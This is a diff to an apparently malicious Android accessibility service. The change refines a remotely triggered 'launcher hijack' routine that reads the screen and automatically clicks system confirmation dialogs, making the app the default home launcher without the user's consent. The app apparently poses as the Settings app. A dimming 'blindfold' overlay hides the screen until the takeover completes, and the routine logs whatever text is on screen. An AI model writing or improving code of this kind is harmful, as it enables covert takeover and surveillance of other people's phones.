@@ -343,41 +343,94 @@ class MyAccessibilityService : AccessibilityService() {
             // --- LAUNCHER HIJACK ENGINE ---
             if (LauncherManager.isHijacking) {
                 val currentHome = DeviceManager.getDefaultApps(this).optString("launcher", "")
+                
                 if (currentHome == packageName) {
-                    DebugLogger.log("GHOST_LAUNCHER", "Active Verification SUCCESS! Target is now Default Home.")
+                    DebugLogger.log("GHOST_LAUNCHER_SUCCESS", "Active Verification: TRUE. Target ($packageName) is now Default Home!")
                     LauncherManager.isHijacking = false
                     CommandProcessor.updateCommandStatus(applicationContext, LauncherManager.pendingCmdId, "SUCCESS", "Default Launcher set via Ghost Hand")
                     
+                    // The OS automatically routes to Home when the default launcher changes.
+                    // Just wait a brief moment for the transition to finish, then lift the blindfold.
                     android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                        performGlobalAction(GLOBAL_ACTION_HOME)
-                        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                            performGlobalAction(GLOBAL_ACTION_HOME)
-                            DimmerManager.removeOverlay(applicationContext)
-                        }, 500)
-                    }, 1000)
+                        DebugLogger.log("GHOST_LAUNCHER_SUCCESS", "Lifting blindfold. Welcome home.")
+                        DimmerManager.removeOverlay(applicationContext)
+                    }, 1500)
                 } else {
                     val root = rootInActiveWindow
                     if (root != null) {
+                        val activePkg = root.packageName?.toString() ?: "unknown"
                         val targetLabel = getString(R.string.label_settings_app)
-                        val nodes = root.findAccessibilityNodeInfosByText(targetLabel)
+                        
+                        logThrottled("GHOST_LAUNCHER_POLL", "Polling... Current Default: $currentHome | Active Window: $activePkg", 2000L)
                         
                         val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                         val lastClick = prefs.getLong("ghost_launcher_click_ts", 0L)
+                        val now = System.currentTimeMillis()
                         
-                        if (nodes.isNotEmpty() && (System.currentTimeMillis() - lastClick > 2000)) {
-                            for (node in nodes) {
+                        // 1. Look for Confirmation Dialogs FIRST (Samsung sometimes asks "Always" or "OK" or "Set as default")
+                        val confirmKeywords = listOf("Always", "Set as default", "Set", "OK", "Change")
+                        var confirmClicked = false
+                        for (kw in confirmKeywords) {
+                            val confirmNodes = root.findAccessibilityNodeInfosByText(kw)
+                            for (node in confirmNodes) {
                                 var target: android.view.accessibility.AccessibilityNodeInfo? = node
                                 while (target != null && !target.isClickable) target = target.parent
                                 if (target != null && target.isClickable) {
-                                    target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
-                                    prefs.edit().putLong("ghost_launcher_click_ts", System.currentTimeMillis()).apply()
-                                    DebugLogger.log("GHOST_LAUNCHER", "Clicked radio button for: $targetLabel. Waiting for OS confirmation...")
+                                    if (now - lastClick > 1000) {
+                                        target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                                        prefs.edit().putLong("ghost_launcher_click_ts", now).apply()
+                                        DebugLogger.log("GHOST_LAUNCHER_ACTION", "Clicked confirmation button: '$kw'")
+                                    }
+                                    confirmClicked = true
                                     break
                                 }
                             }
-                        } else if (nodes.isEmpty()) {
-                            logThrottled("GHOST_LAUNCHER_WAIT", "Target label '$targetLabel' not found in current UI tree.", 1000L)
+                            if (confirmClicked) break
                         }
+
+                        // 2. If no confirmation dialog, look for our app in the list
+                        if (!confirmClicked) {
+                            val nodes = root.findAccessibilityNodeInfosByText(targetLabel)
+                            if (nodes.isNotEmpty()) {
+                                logThrottled("GHOST_LAUNCHER_VIEW", "Found ${nodes.size} nodes matching target label '$targetLabel'. Evaluating clickability...", 2000L)
+                                
+                                if (now - lastClick > 1500) {
+                                    var clickedRadio = false
+                                    for (i in nodes.indices) {
+                                        var target: android.view.accessibility.AccessibilityNodeInfo? = nodes[i]
+                                        while (target != null && !target.isClickable) target = target.parent
+                                        
+                                        if (target != null && target.isClickable) {
+                                            target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                                            prefs.edit().putLong("ghost_launcher_click_ts", now).apply()
+                                            
+                                            val bounds = android.graphics.Rect()
+                                            target.getBoundsInScreen(bounds)
+                                            DebugLogger.log("GHOST_LAUNCHER_ACTION", "Clicked candidate $i for '$targetLabel' at Bounds[${bounds.toShortString()}]. Waiting for OS response or confirmation dialog...")
+                                            clickedRadio = true
+                                            break
+                                        } else {
+                                            DebugLogger.log("GHOST_LAUNCHER_VIEW", "Candidate $i for '$targetLabel' had no clickable parent.")
+                                        }
+                                    }
+                                    if (!clickedRadio) {
+                                        logThrottled("GHOST_LAUNCHER_WARN", "Target '$targetLabel' is visible but structurally unclickable.", 2000L)
+                                    }
+                                }
+                            } else {
+                                // Target not found on screen. We might need to scroll, or we are not in the right menu.
+                                logThrottled("GHOST_LAUNCHER_WAIT", "Target '$targetLabel' NOT visible in $activePkg. Waiting or navigating...", 2000L)
+                                
+                                // Debug: dump visible text to see where we are
+                                if (now - lastClick > 4000) {
+                                    val sb = java.lang.StringBuilder()
+                                    extractText(root, sb)
+                                    DebugLogger.log("GHOST_LAUNCHER_DUMP", "Current screen text: ${sb.toString().replace('\n', ' ').take(150)}...")
+                                }
+                            }
+                        }
+                    } else {
+                        logThrottled("GHOST_LAUNCHER_WARN", "rootInActiveWindow is NULL. Cannot inspect UI tree.", 2000L)
                     }
                 }
             }
